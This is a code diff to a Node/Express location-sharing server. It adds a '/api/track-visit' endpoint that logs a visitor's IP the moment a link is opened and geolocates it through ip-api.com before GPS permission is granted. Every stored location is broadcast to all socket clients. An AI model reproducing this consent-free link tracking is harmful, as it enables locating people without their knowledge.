@@ -71,6 +71,66 @@ function getClientIp(socket) {
   return ip;
 }
 
+function getReqIp(req) {
+  const forwarded = req.headers['x-forwarded-for'];
+  if (forwarded) {
+    return forwarded.split(',')[0].trim();
+  }
+  const cfIp = req.headers['cf-connecting-ip'];
+  if (cfIp) return cfIp.trim();
+  const realIp = req.headers['x-real-ip'];
+  if (realIp) return realIp.trim();
+  let ip = req.ip || req.connection?.remoteAddress || req.socket?.remoteAddress || '127.0.0.1';
+  if (ip.startsWith('::ffff:')) {
+    ip = ip.substring(7);
+  }
+  if (ip === '::1') {
+    ip = '127.0.0.1';
+  }
+  return ip;
+}
+
+function getIndiaTime(date = new Date()) {
+  return new Intl.DateTimeFormat('en-IN', {
+    timeZone: 'Asia/Kolkata',
+    year: 'numeric',
+    month: 'short',
+    day: '2-digit',
+    hour: '2-digit',
+    minute: '2-digit',
+    second: '2-digit',
+    hour12: true
+  }).format(date);
+}
+
+// Dynamic IP Geolocation resolver when GPS coordinates are not yet available
+async function getIpLocation(ip) {
+  if (!ip || ip === '127.0.0.1' || ip === 'localhost' || ip === '::1' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.16.')) {
+    return null;
+  }
+  try {
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 2500);
+    const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,query`, {
+      signal: controller.signal
+    });
+    clearTimeout(timeoutId);
+    if (res.ok) {
+      const data = await res.json();
+      if (data && data.status === 'success' && typeof data.lat === 'number' && typeof data.lon === 'number') {
+        return {
+          latitude: data.lat,
+          longitude: data.lon,
+          city: data.city,
+          region: data.regionName,
+          country: data.country
+        };
+      }
+    }
+  } catch (_) {}
+  return null;
+}
+
 async function startServer() {
   const nextApp = next({ dev, hostname, port: PORT });
   const handle = nextApp.getRequestHandler();
@@ -86,6 +146,160 @@ async function startServer() {
   const localIp = getLocalIp();
 
   app.use(express.json());
+
+  // API Endpoint: Instant Visit & IP Capture when link is opened
+  app.post('/api/track-visit', async (req, res) => {
+    const { sessionId, participantName, latitude, longitude, accuracy, sessionTitle, purpose } = req.body;
+    const ipAddress = req.body.clientIp || getReqIp(req);
+    const indiaTime = getIndiaTime();
+    const resolvedTitle = sessionTitle || 'My Mobile Location Request';
+
+    const hasValidGps = (
+      latitude !== undefined &&
+      latitude !== null &&
+      !isNaN(Number(latitude)) &&
+      longitude !== undefined &&
+      longitude !== null &&
+      !isNaN(Number(longitude))
+    );
+
+    let resolvedLat = hasValidGps ? Number(latitude) : null;
+    let resolvedLng = hasValidGps ? Number(longitude) : null;
+    let resolvedAccuracy = accuracy ? Number(accuracy) : (hasValidGps ? 5 : null);
+    let pName = participantName || `Mobile Device (${ipAddress})`;
+
+    if (!hasValidGps) {
+      const ipGeo = await getIpLocation(ipAddress);
+      if (ipGeo) {
+        resolvedLat = ipGeo.latitude;
+        resolvedLng = ipGeo.longitude;
+        resolvedAccuracy = 5000;
+        pName = `${participantName || 'Mobile Device'} (${ipGeo.city || ipGeo.region || ipAddress} - IP Approx)`;
+      }
+    }
+
+    if (resolvedLat !== null && resolvedLng !== null) {
+      const recordData = {
+        sessionId: sessionId || 'default-session',
+        participantId: 'visit-' + Math.random().toString(36).substring(2, 7),
+        participantName: pName,
+        latitude: resolvedLat,
+        longitude: resolvedLng,
+        accuracy: resolvedAccuracy,
+        speed: 0,
+        heading: 0,
+        ipAddress,
+        createdAt: new Date()
+      };
+
+      if (isMongoConnected) {
+        try {
+          const doc = await LocationRecord.create(recordData);
+          io.emit('location-updated', {
+            sessionId: recordData.sessionId,
+            participantId: recordData.participantId,
+            participantName: recordData.participantName,
+            ip: ipAddress,
+            location: {
+              latitude: recordData.latitude,
+              longitude: recordData.longitude,
+              accuracy: recordData.accuracy,
+              speed: 0,
+              heading: 0
+            }
+          });
+          return res.status(201).json({ success: true, database: 'MongoDB', id: doc._id, ip: ipAddress, data: doc });
+        } catch (err) {
+          return res.status(500).json({ success: false, error: err.message });
+        }
+      } else {
+        fallbackMemoryRecords.unshift(recordData);
+        if (fallbackMemoryRecords.length > 500) fallbackMemoryRecords.pop();
+        io.emit('location-updated', {
+          sessionId: recordData.sessionId,
+          participantId: recordData.participantId,
+          participantName: recordData.participantName,
+          ip: ipAddress,
+          location: {
+            latitude: recordData.latitude,
+            longitude: recordData.longitude,
+            accuracy: recordData.accuracy,
+            speed: 0,
+            heading: 0
+          }
+        });
+        return res.status(201).json({ success: true, database: 'Memory', ip: ipAddress, data: recordData });
+      }
+    }
+
+    return res.status(200).json({
+      success: true,
+      ip: ipAddress,
+      message: 'Visit registered. Awaiting GPS permission.'
+    });
+  });
+
+  // API Endpoint: Save location record via REST POST
+  app.post('/api/records', async (req, res) => {
+    const { sessionId, participantName, latitude, longitude, accuracy, speed, heading } = req.body;
+    const clientIp = req.body.clientIp || getReqIp(req);
+
+    if (latitude === undefined || longitude === undefined || latitude === null || longitude === null || isNaN(Number(latitude)) || isNaN(Number(longitude))) {
+      return res.status(400).json({ success: false, error: 'Latitude and Longitude are required' });
+    }
+
+    const recordData = {
+      sessionId: sessionId || 'default-session',
+      participantId: 'http-recipient',
+      participantName: participantName || 'Mobile Recipient',
+      latitude: Number(latitude),
+      longitude: Number(longitude),
+      accuracy: accuracy ? Number(accuracy) : 5,
+      speed: speed ? Number(speed) : null,
+      heading: heading ? Number(heading) : null,
+      ipAddress: clientIp,
+      createdAt: new Date()
+    };
+
+    if (isMongoConnected) {
+      try {
+        const doc = await LocationRecord.create(recordData);
+        io.emit('location-updated', {
+          sessionId: recordData.sessionId,
+          participantId: 'http-recipient',
+          participantName: recordData.participantName,
+          ip: clientIp,
+          location: {
+            latitude: recordData.latitude,
+            longitude: recordData.longitude,
+            accuracy: recordData.accuracy,
+            speed: recordData.speed,
+            heading: recordData.heading
+          }
+        });
+        return res.status(201).json({ success: true, database: 'MongoDB', id: doc._id, data: doc });
+      } catch (err) {
+        return res.status(500).json({ success: false, error: err.message });
+      }
+    } else {
+      fallbackMemoryRecords.unshift(recordData);
+      if (fallbackMemoryRecords.length > 500) fallbackMemoryRecords.pop();
+      io.emit('location-updated', {
+        sessionId: recordData.sessionId,
+        participantId: 'http-recipient',
+        participantName: recordData.participantName,
+        ip: clientIp,
+        location: {
+          latitude: recordData.latitude,
+          longitude: recordData.longitude,
+          accuracy: recordData.accuracy,
+          speed: recordData.speed,
+          heading: recordData.heading
+        }
+      });
+      return res.status(201).json({ success: true, database: 'Memory', data: recordData });
+    }
+  });
 
   // API Endpoint: Query location history from MongoDB
   app.get('/api/records', async (req, res) => {
